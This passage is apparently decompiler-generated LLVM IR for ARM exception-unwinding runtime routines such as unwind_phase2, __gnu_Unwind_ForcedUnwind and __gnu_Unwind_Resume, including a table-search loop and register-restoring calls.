  %v0_19fb0.ph = phi i32 [ %v0_19fb0, %dec_label_pc_19fac ], [ %v2_19f84, %dec_label_pc_19fb0.preheader ]
  br label %dec_label_pc_19fb0

dec_label_pc_19fb0:                               ; preds = %dec_label_pc_19fb0.outer, %dec_label_pc_1a014
  %v0_19fb0 = phi i32 [ %v1_1a014, %dec_label_pc_1a014 ], [ %v0_19fb0.ph, %dec_label_pc_19fb0.outer ]
  %v2_19fb0 = add i32 %v0_19fb0, %v1_1a00c.ph
  %tmp = icmp slt i32 %v2_19fb0, 0
  %v4_19fb4 = zext i1 %tmp to i32
  %v5_19fb4 = add i32 %v4_19fb4, %v2_19fb0
  %v3_19fb8 = sdiv i32 %v5_19fb4, 2
  %v3_19fbc = mul i32 %v3_19fb8, 8
  store i32 %v3_19fbc, i32* @ip, align 4
  %v2_19fc0 = add i32 %v3_19fbc, %v0_19fc0.pre
  %v3_19fc0 = inttoptr i32 %v2_19fc0 to i32*
  %v4_19fc0 = load i32, i32* %v3_19fc0, align 4
  %v1_19fc4 = and i32 %v4_19fc0, 1073741824
  %v2_19fc4 = icmp eq i32 %v1_19fc4, 0
  %v2_19fc8 = or i32 %v4_19fc0, -2147483648
  %tmp79 = bitcast i32 %v4_19fc0 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_19fcc = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_19fc4, i32 %v2_19fcc, i32 %v2_19fc8
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_19fd0 = icmp eq i32 %v2_19f84, %v3_19fb8
  store i32 %v2_19fc0, i32* %r7.global-to-local, align 4
  br i1 %v9_19fd0, label %dec_label_pc_1a000, label %dec_label_pc_19fe0

dec_label_pc_19fe0:                               ; preds = %dec_label_pc_19fb0
  %v2_19fe4 = add i32 %v3_19fbc, %v1_19fe0
  %v3_19fe4 = inttoptr i32 %v2_19fe4 to i32*
  %v4_19fe4 = load i32, i32* %v3_19fe4, align 4
  %v1_19fec = and i32 %v4_19fe4, 1073741824
  %v2_19fec = icmp eq i32 %v1_19fec, 0
  %v2_19ff0 = or i32 %v4_19fe4, -2147483648
  %tmp81 = bitcast i32 %v4_19fe4 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_19ff4 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_19fec, i32 %v2_19ff4, i32 %v2_19ff0
  %v1_19ff8 = add i32 %v2_19fe4, -1
  %v2_19ffc = add i32 %storemerge39, %v1_19ff8
  br label %dec_label_pc_1a000

dec_label_pc_1a000:                               ; preds = %dec_label_pc_19fb0, %dec_label_pc_19fe0
  %storemerge40 = phi i32 [ %v2_19ffc, %dec_label_pc_19fe0 ], [ -1, %dec_label_pc_19fb0 ]
  %v2_1a000 = add i32 %storemerge, %v2_19fc0
  %v0_1a004 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a004 = icmp ult i32 %v0_1a004, %v2_1a000
  br i1 %v3_1a004, label %dec_label_pc_1a00c, label %dec_label_pc_19fa4

dec_label_pc_1a00c:                               ; preds = %dec_label_pc_1a000
  %v9_1a00c = icmp eq i32 %v3_19fb8, %v1_1a00c.ph
  br i1 %v9_1a00c, label %dec_label_pc_19f94.loopexit, label %dec_label_pc_1a014

dec_label_pc_1a014:                               ; preds = %dec_label_pc_1a00c
  %v1_1a014 = add nsw i32 %v3_19fb8, -1
  br label %dec_label_pc_19fb0

dec_label_pc_1a01c:                               ; preds = %dec_label_pc_19fa4
  %v2_1a01c = load i32, i32* %v3_19fc0, align 4
  %v1_1a020 = and i32 %v2_1a01c, 1073741824
  %v2_1a020 = icmp eq i32 %v1_1a020, 0
  %v2_1a024 = or i32 %v2_1a01c, -2147483648
  %tmp83 = bitcast i32 %v2_1a01c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_1a028 = bitcast float %tmp84 to i32
  %v0_1a02c = select i1 %v2_1a020, i32 %v2_1a028, i32 %v2_1a024
  %v2_1a02c = add i32 %v0_1a02c, %v2_19fc0
  %v1_1a030 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a030 = add i32 %v1_1a030, 72
  %v3_1a030 = inttoptr i32 %v2_1a030 to i32*
  store i32 %v2_1a02c, i32* %v3_1a030, align 4
  %v0_1a034 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a034 = add i32 %v0_1a034, 4
  %v2_1a034 = inttoptr i32 %v1_1a034 to i32*
  %v3_1a034 = load i32, i32* %v2_1a034, align 4
  %v7_1a038 = icmp eq i32 %v3_1a034, 1
  br i1 %v7_1a038, label %.thread10, label %dec_label_pc_1a04c

.thread10:                                        ; preds = %dec_label_pc_1a01c
  %v1_1a038 = add i32 %v3_1a034, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_1a044 = load i32, i32* %r6.global-to-local, align 4
  %v3_1a044 = add i32 %v2_1a044, 16
  %v4_1a044 = inttoptr i32 %v3_1a044 to i32*
  store i32 %v1_1a038, i32* %v4_1a044, align 4
  br label %dec_label_pc_19f4c

dec_label_pc_1a04c:                               ; preds = %dec_label_pc_1a01c
  %v1_1a04c = icmp slt i32 %v3_1a034, 0
  br i1 %v1_1a04c, label %.thread38, label %dec_label_pc_1a064

.thread38:                                        ; preds = %dec_label_pc_1a04c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1a058 = load i32, i32* %r6.global-to-local, align 4
  %v5_1a058 = add i32 %v4_1a058, 76
  %v6_1a058 = inttoptr i32 %v5_1a058 to i32*
  store i32 %v1_1a034, i32* %v6_1a058, align 4
  %v3_1a05c = load i32, i32* %r2.global-to-local, align 4
  %v4_1a05c = load i32, i32* %r6.global-to-local, align 4
  %v5_1a05c = add i32 %v4_1a05c, 80
  %v6_1a05c = inttoptr i32 %v5_1a05c to i32*
  store i32 %v3_1a05c, i32* %v6_1a05c, align 4
  br label %dec_label_pc_1a084

dec_label_pc_1a064:                               ; preds = %dec_label_pc_1a04c
  %v1_1a064 = and i32 %v3_1a034, 1073741824
  %v2_1a064 = icmp eq i32 %v1_1a064, 0
  %v2_1a068 = or i32 %v3_1a034, -2147483648
  %tmp85 = bitcast i32 %v3_1a034 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_1a06c = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_1a064, i32 %v2_1a06c, i32 %v2_1a068
  %v1_1a070 = add i32 %storemerge42, 4
  %v2_1a074 = add i32 %v1_1a070, %v0_1a034
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1a07c = load i32, i32* %r6.global-to-local, align 4
  %v2_1a07c = add i32 %v1_1a07c, 76
  %v3_1a07c = inttoptr i32 %v2_1a07c to i32*
  store i32 %v2_1a074, i32* %v3_1a07c, align 4
  %v0_1a080 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a080 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a080 = add i32 %v1_1a080, 80
  %v3_1a080 = inttoptr i32 %v2_1a080 to i32*
  store i32 %v0_1a080, i32* %v3_1a080, align 4
  br label %dec_label_pc_1a084

dec_label_pc_1a084:                               ; preds = %.thread38, %dec_label_pc_1a064
  %v0_1a084 = load i32, i32* %r6.global-to-local, align 4
  %v1_1a084 = add i32 %v0_1a084, 76
  %v2_1a084 = inttoptr i32 %v1_1a084 to i32*
  %v3_1a084 = load i32, i32* %v2_1a084, align 4
  store i32 %v3_1a084, i32* %r2.global-to-local, align 4
  %v1_1a088 = inttoptr i32 %v3_1a084 to i32*
  %v2_1a088 = load i32, i32* %v1_1a088, align 4
  %v1_1a08c = icmp slt i32 %v2_1a088, 0
  br i1 %v1_1a08c, label %dec_label_pc_1a0b0, label %dec_label_pc_1a094

dec_label_pc_1a094:                               ; preds = %dec_label_pc_1a084
  %v1_1a094 = and i32 %v2_1a088, 1073741824
  %v2_1a094 = icmp eq i32 %v1_1a094, 0
  %v2_1a098 = or i32 %v2_1a088, -2147483648
  %tmp87 = bitcast i32 %v2_1a088 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_1a09c = bitcast float %tmp88 to i32
  %v0_1a0a0 = select i1 %v2_1a094, i32 %v2_1a09c, i32 %v2_1a098
  %v2_1a0a0 = add i32 %v0_1a0a0, %v3_1a084
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_1a0a8 = add i32 %v0_1a084, 16
  %v3_1a0a8 = inttoptr i32 %v2_1a0a8 to i32*
  store i32 %v2_1a0a0, i32* %v3_1a0a8, align 4
  br label %dec_label_pc_19f4c

dec_label_pc_1a0b0:                               ; preds = %dec_label_pc_1a084
  %v3_1a0b0 = udiv i32 %v2_1a088, 16777216
  %v1_1a0b4 = urem i32 %v3_1a0b0, 16
  %v2_1a0b4 = icmp eq i32 %v1_1a0b4, 0
  br i1 %v2_1a0b4, label %dec_label_pc_1a0bc, label %dec_label_pc_1a0d0

dec_label_pc_1a0bc:                               ; preds = %dec_label_pc_1a0b0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a0c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a0c4 = add i32 %v0_1a0c4, -39336
  %v2_1a0c8 = add i32 %v0_1a084, 16
  %v3_1a0c8 = inttoptr i32 %v2_1a0c8 to i32*
  store i32 %v2_1a0c4, i32* %v3_1a0c8, align 4
  br label %dec_label_pc_19f4c

dec_label_pc_1a0d0:                               ; preds = %dec_label_pc_1a0b0
  %v7_1a0d0 = icmp eq i32 %v1_1a0b4, 1
  br i1 %v7_1a0d0, label %dec_label_pc_1a0f4, label %dec_label_pc_1a0d8

dec_label_pc_1a0d8:                               ; preds = %dec_label_pc_1a0d0
  %v7_1a0d8 = icmp eq i32 %v1_1a0b4, 2
  br i1 %v7_1a0d8, label %dec_label_pc_1a0e0, label %dec_label_pc_19f94

dec_label_pc_1a0e0:                               ; preds = %dec_label_pc_1a0d8
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a0e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a0e8 = add i32 %v0_1a0e8, -39352
  %v2_1a0ec = add i32 %v0_1a084, 16
  %v3_1a0ec = inttoptr i32 %v2_1a0ec to i32*
  store i32 %v2_1a0e8, i32* %v3_1a0ec, align 4
  br label %dec_label_pc_19f4c

dec_label_pc_1a0f4:                               ; preds = %dec_label_pc_1a0d0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a0fc = load i32, i32* %r5.global-to-local, align 4
  %v2_1a0fc = add i32 %v0_1a0fc, -39344
  %v2_1a100 = add i32 %v0_1a084, 16
  %v3_1a100 = inttoptr i32 %v2_1a100 to i32*
  store i32 %v2_1a0fc, i32* %v3_1a100, align 4
  br label %dec_label_pc_19f4c

; uselistorder directives
  uselistorder i32 %v1_1a0b4, { 2, 1, 0 }
  uselistorder i32 %v0_1a084, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_1a034, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_1a004, { 1, 0 }
  uselistorder i32 %v3_19fbc, { 2, 1, 0 }
  uselistorder i32 %v3_19fb8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_19fb0, { 1, 0 }
  uselistorder i32 %v0_19fb0, { 1, 0 }
  uselistorder i32 %v2_19f84, { 1, 0 }
  uselistorder i32 %v0_19fc0.pre, { 1, 0 }
  uselistorder i32 %v3_19f70, { 1, 0 }
  uselistorder i32 %v1_19f24, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_1a084, { 1, 0 }
  uselistorder label %dec_label_pc_1a000, { 1, 0 }
  uselistorder label %dec_label_pc_19fb0, { 1, 0 }
  uselistorder label %dec_label_pc_19f94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19f4c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_1a10c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1a10c:
  %v0_1a10c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a10c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1a10c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1a10c, %bb
  %v10_1a114 = phi i32 [ %arg1, %dec_label_pc_1a10c ], [ 0, %bb ]
  ret i32 %v10_1a114

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_1a128 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_1a13c = inttoptr i32 %v1_1a128 to i32*
  %v2_1a13c = load i32, i32* %v1_1a13c, align 4
  store i32 %v2_1a13c, i32* %r0.global-to-local, align 4
  %v12_1a13c = add i32 %entry_vrs, 20
  %v1_1a148 = inttoptr i32 %v12_1a13c to i32*
  %v2_1a148 = load i32, i32* %v1_1a148, align 4
  store i32 %v2_1a148, i32* %r0.global-to-local, align 4
  %v12_1a148 = add i32 %entry_vrs, 36
  %v1_1a150 = inttoptr i32 %v12_1a148 to i32*
  %v2_1a150 = load i32, i32* %v1_1a150, align 4
  store i32 %v2_1a150, i32* %r0.global-to-local, align 4
  %v12_1a150 = add i32 %entry_vrs, 52
  store i32 %v12_1a150, i32* @ip, align 4
  %v13_1a154 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_1a154, i32* @lr, align 4
  %v1_1a158 = inttoptr i32 %v12_1a150 to i32*
  %v2_1a158 = load i32, i32* %v1_1a158, align 4
  store i32 %v2_1a158, i32* %r0.global-to-local, align 4
  %v9_1a158 = add i32 %entry_vrs, 64
  %v10_1a158 = inttoptr i32 %v9_1a158 to i32*
  %v11_1a158 = load i32, i32* %v10_1a158, align 4
  store i32 0, i32* @r4, align 4
  %v1_1a160 = add i32 %ucbp, 12
  %v2_1a160 = inttoptr i32 %v1_1a160 to i32*
  %v3_1a160 = load i32, i32* %v2_1a160, align 4
  store i32 %v2_1a158, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_1a178 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_1a158)
  store i32 %v2_1a178, i32* %r0.global-to-local, align 4
  %v0_1a17c = load i32, i32* @r6, align 4
  %v1_1a17c = load i32, i32* @r4, align 4
  %v9_1a17c = icmp eq i32 %v0_1a17c, %v1_1a17c
  store i32 %v2_1a178, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_1a17c, label %dec_label_pc_1a190, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_1a19c

dec_label_pc_1a190:                               ; preds = %entry
  store i32 %v0_1a17c, i32* @r4, align 4
  br label %dec_label_pc_1a198

dec_label_pc_1a198:                               ; preds = %dec_label_pc_1a260, %dec_label_pc_1a190
  br label %dec_label_pc_1a19c

dec_label_pc_1a19c:                               ; preds = %.thread, %dec_label_pc_1a198
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_1a198 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_1a19c = icmp eq i32 %v2_1a178, 0
  br i1 %v2_1a19c, label %dec_label_pc_1a214, label %.thread2.dec_label_pc_1a1b0_crit_edge

.thread2.dec_label_pc_1a1b0_crit_edge:            ; preds = %dec_label_pc_1a19c
  br label %dec_label_pc_1a1b0

dec_label_pc_1a1b0:                               ; preds = %.thread2.dec_label_pc_1a1b0_crit_edge, %dec_label_pc_1a214
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1a1c0 = load i32, i32* @r5, align 4
  store i32 %v0_1a1c0, i32* @r3, align 4
  store i32 106960, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_1a160)
  br i1 false, label %dec_label_pc_1a1d8, label %dec_label_pc_1a200

dec_label_pc_1a1d8:                               ; preds = %dec_label_pc_1a1b0
  br i1 undef, label %dec_label_pc_1a1e0, label %dec_label_pc_1a204

dec_label_pc_1a1e0:                               ; preds = %dec_label_pc_1a1d8
  br i1 undef, label %dec_label_pc_1a260, label %dec_label_pc_1a1f8

dec_label_pc_1a1f8:                               ; preds = %dec_label_pc_1a1e0
  br i1 undef, label %dec_label_pc_1a258, label %dec_label_pc_1a200

dec_label_pc_1a200:                               ; preds = %dec_label_pc_1a1b0, %dec_label_pc_1a1f8
  br label %dec_label_pc_1a204

dec_label_pc_1a204:                               ; preds = %dec_label_pc_1a1d8, %dec_label_pc_1a200
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_1a214:                               ; preds = %dec_label_pc_1a19c
  store i32 %v11_1a158, i32* @r3, align 4
  %v2_1a218 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_1a218, i32* @r4, align 4
  %v1_1a21c = load i32, i32* @r5, align 4
  %v2_1a21c = add i32 %v1_1a21c, 20
  %v3_1a21c = inttoptr i32 %v2_1a21c to i32*
  store i32 %v11_1a158, i32* %v3_1a21c, align 4
  store i32 %v2_1a218, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_1a22c = call i32 @memcpy()
  %v0_1a234 = load i32, i32* @r6, align 4
  store i32 %v0_1a234, i32* %r0.global-to-local, align 4
  %v0_1a238 = load i32, i32* @r5, align 4
  %v1_1a23c = add i32 %v0_1a238, 16
  %v2_1a23c = inttoptr i32 %v1_1a23c to i32*
  %v3_1a23c = load i32, i32* %v2_1a23c, align 4
  store i32 %v3_1a23c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_1a23c)
  %v0_1a24c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a24c, i32* @r4, align 4
  br label %dec_label_pc_1a1b0

dec_label_pc_1a258:                               ; preds = %dec_label_pc_1a1f8
  br label %dec_label_pc_1a260

dec_label_pc_1a260:                               ; preds = %dec_label_pc_1a1e0, %dec_label_pc_1a258
  br label %dec_label_pc_1a198

; uselistorder directives
  uselistorder i32 %v11_1a158, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 6, 7, 1, 0, 4, 3, 9, 8, 5 }
  uselistorder i32* @r3, { 95, 96, 33, 34, 22, 97, 98, 25, 99, 100, 4, 101, 102, 103, 5, 104, 105, 106, 6, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 0, 125, 126, 127, 128, 23, 24, 26, 27, 28, 29, 30, 31, 32, 63, 50, 51, 52, 129, 130, 143, 144, 145, 133, 134, 135, 136, 137, 1, 138, 8, 36, 37, 131, 132, 92, 93, 94, 64, 65, 66, 67, 69, 68, 11, 12, 13, 149, 146, 147, 148, 2, 150, 151, 152, 35, 38, 39, 40, 41, 42, 43, 139, 140, 141, 142, 70, 71, 72, 73, 53, 74, 75, 10, 76, 77, 78, 79, 80, 81, 82, 3, 14, 15, 16, 17, 18, 19, 20, 21, 44, 45, 46, 47, 48, 49, 54, 9, 55, 56, 57, 58, 59, 60, 61, 62, 83, 84, 85, 86, 87, 88, 7, 89, 90, 91 }
  uselistorder i32 10, { 1, 2, 44, 45, 46, 5, 65, 64, 100, 98, 66, 92, 0, 6, 47, 48, 11, 42, 43, 37, 4, 49, 38, 12, 39, 50, 13, 51, 14, 52, 15, 53, 16, 54, 17, 55, 18, 56, 19, 57, 20, 58, 21, 59, 22, 60, 23, 61, 24, 62, 63, 25, 26, 27, 28, 29, 30, 7, 67, 68, 69, 70, 71, 72, 73, 74, 75, 31, 76, 77, 78, 8, 79, 80, 81, 32, 9, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 3, 93, 94, 34, 95, 40, 41, 10, 96, 33, 97, 35, 99, 36 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1a260, { 1, 0 }
  uselistorder label %dec_label_pc_1a204, { 1, 0 }
  uselistorder label %dec_label_pc_1a200, { 1, 0 }
  uselistorder label %dec_label_pc_1a1b0, { 1, 0 }
  uselistorder label %dec_label_pc_1a19c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_1a274 = add i32 %ucbp, 12
  %v3_1a274 = inttoptr i32 %v2_1a274 to i32*
  store i32 %stop_fn, i32* %v3_1a274, align 4
  %v3_1a278 = add i32 %ucbp, 24
  %v4_1a278 = inttoptr i32 %v3_1a278 to i32*
  store i32 %tmp, i32* %v4_1a278, align 4
  %v1_1a27c = add i32 %entry_vrs, 60
  %v2_1a27c = inttoptr i32 %v1_1a27c to i32*
  %v3_1a27c = load i32, i32* %v2_1a27c, align 4
  %v2_1a284 = add i32 %entry_vrs, 64
  %v3_1a284 = inttoptr i32 %v2_1a284 to i32*
  store i32 %v3_1a27c, i32* %v3_1a284, align 4
  %v3_1a28c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_1a28c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_1a2a46 = add i32 %vrs, 64
  %v2_1a2a47 = inttoptr i32 %v1_1a2a46 to i32*
  %v3_1a2a48 = load i32, i32* %v2_1a2a47, align 4
  %v2_1a2a89 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_1a2a48)
  store i32 %v2_1a2a89, i32* %r0.global-to-local, align 4
  %v2_1a2ac11 = icmp eq i32 %v2_1a2a89, 0
  br i1 %v2_1a2ac11, label %dec_label_pc_1a2b4, label %dec_label_pc_1a2e4

dec_label_pc_1a2b4:                               ; preds = %entry, %dec_label_pc_1a2b4.dec_label_pc_1a2a0_crit_edge
  %v0_1a2b4 = load i32, i32* @r5, align 4
  %v1_1a2b4 = add i32 %v0_1a2b4, 64
  %v2_1a2b4 = inttoptr i32 %v1_1a2b4 to i32*
  %v3_1a2b4 = load i32, i32* %v2_1a2b4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1a2bc = load i32, i32* @r4, align 4
  %v2_1a2bc = add i32 %v1_1a2bc, 20
  %v3_1a2bc = inttoptr i32 %v2_1a2bc to i32*
  store i32 %v3_1a2b4, i32* %v3_1a2bc, align 4
  %v0_1a2c0 = load i32, i32* @r4, align 4
  %v1_1a2c8 = add i32 %v0_1a2c0, 16
  %v2_1a2c8 = inttoptr i32 %v1_1a2c8 to i32*
  %v3_1a2c8 = load i32, i32* %v2_1a2c8, align 4
  call void @__pseudo_branch(i32 %v3_1a2c8)
  %v0_1a2d4 = load i32, i32* %r0.global-to-local, align 4
  %v7_1a2d4 = icmp eq i32 %v0_1a2d4, 8
  br i1 %v7_1a2d4, label %dec_label_pc_1a2b4.dec_label_pc_1a2a0_crit_edge, label %dec_label_pc_1a2dc

dec_label_pc_1a2b4.dec_label_pc_1a2a0_crit_edge:  ; preds = %dec_label_pc_1a2b4
  %v0_1a2a0.pre = load i32, i32* @r4, align 4
  %v0_1a2a4.pre = load i32, i32* @r5, align 4
  store i32 %v0_1a2a0.pre, i32* %r0.global-to-local, align 4
  %v1_1a2a4 = add i32 %v0_1a2a4.pre, 64
  %v2_1a2a4 = inttoptr i32 %v1_1a2a4 to i32*
  %v3_1a2a4 = load i32, i32* %v2_1a2a4, align 4
  %v2_1a2a8 = call i32 @get_eit_entry(i32 %v0_1a2a0.pre, i32 %v3_1a2a4)
  store i32 %v2_1a2a8, i32* %r0.global-to-local, align 4
  %v2_1a2ac = icmp eq i32 %v2_1a2a8, 0
  br i1 %v2_1a2ac, label %dec_label_pc_1a2b4, label %dec_label_pc_1a2e4

dec_label_pc_1a2dc:                               ; preds = %dec_label_pc_1a2b4
  %v7_1a2dc = icmp eq i32 %v0_1a2d4, 7
  br i1 %v7_1a2dc, label %dec_label_pc_1a2e8, label %dec_label_pc_1a2e4

dec_label_pc_1a2e4:                               ; preds = %entry, %dec_label_pc_1a2b4.dec_label_pc_1a2a0_crit_edge, %dec_label_pc_1a2dc
  %v0_1a2e4 = call i32 @abort()
  store i32 %v0_1a2e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a2e8

dec_label_pc_1a2e8:                               ; preds = %dec_label_pc_1a2dc, %dec_label_pc_1a2e4
  %v0_1a2e8 = load i32, i32* @r5, align 4
  %v1_1a2e8 = add i32 %v0_1a2e8, 4
  store i32 %v1_1a2e8, i32* %r0.global-to-local, align 4
  %v1_1a2ec = inttoptr i32 %v1_1a2e8 to i32*
  %v2_1a2ec = call i32 @__restore_core_regs(i32* %v1_1a2ec)
  store i32 %v2_1a2ec, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_1a2e8, { 1, 0 }
  uselistorder label %dec_label_pc_1a2e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a2b4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_1a2f0 = add i32 %ucbp, 20
  %v2_1a2f0 = inttoptr i32 %v1_1a2f0 to i32*
  %v3_1a2f0 = load i32, i32* %v2_1a2f0, align 4
  %v1_1a2f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a2f8 = add i32 %v1_1a2f8, 64
  %v3_1a2f8 = inttoptr i32 %v2_1a2f8 to i32*
  store i32 %v3_1a2f0, i32* %v3_1a2f8, align 4
  %v1_1a2fc = add i32 %ucbp, 12
  %v2_1a2fc = inttoptr i32 %v1_1a2fc to i32*
  %v3_1a2fc = load i32, i32* %v2_1a2fc, align 4
  %v2_1a300 = icmp eq i32 %v3_1a2fc, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_1a30c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1a30c, i32* @r5, align 4
  br i1 %v2_1a300, label %dec_label_pc_1a314, label %dec_label_pc_1a350

dec_label_pc_1a314:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_1a320 = add i32 %ucbp, 16
  %v2_1a320 = inttoptr i32 %v1_1a320 to i32*
  %v3_1a320 = load i32, i32* %v2_1a320, align 4
  call void @__pseudo_branch(i32 %v3_1a320)
  br i1 false, label %dec_label_pc_1a348, label %dec_label_pc_1a334

dec_label_pc_1a334:                               ; preds = %dec_label_pc_1a314
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_15318.961 to i32))
  %v0_1a33c = load i32, i32* @r4, align 4
  %v0_1a340 = load i32, i32* @r5, align 4
  store i32 %v0_1a340, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_1a33c, i32 %v0_1a340)
  br label %dec_label_pc_1a348

dec_label_pc_1a348:                               ; preds = %dec_label_pc_1a314, %dec_label_pc_1a334
  %v0_1a348 = load i32, i32* @r5, align 4
  %v1_1a348 = add i32 %v0_1a348, 4
  %v1_1a34c = inttoptr i32 %v1_1a348 to i32*
  %v2_1a34c = call i32 @__restore_core_regs(i32* %v1_1a34c)
  %v1_1a354.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1a350

dec_label_pc_1a350:                               ; preds = %entry, %dec_label_pc_1a348
  %v1_1a354 = phi i32 [ %v0_1a30c, %entry ], [ %v1_1a354.pre, %dec_label_pc_1a348 ]
  %v3_1a354 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_1a354, i32 1)
  %v0_1a358 = call i32 @abort()
  ret i32 %v0_1a358

; uselistorder directives
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 10, 9, 8, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 43, 44, 45, 46, 47, 49, 20, 17, 18, 19, 13, 14, 15, 21, 22, 16, 4, 5, 6, 7, 8, 9, 10, 11, 12, 28, 54, 58, 57, 56, 50, 51, 29, 30, 35, 36, 37, 52, 53, 55, 38, 39, 48, 31, 40, 32, 23, 24, 0, 25, 26, 27, 33, 34, 41, 42, 1, 2, 3 }
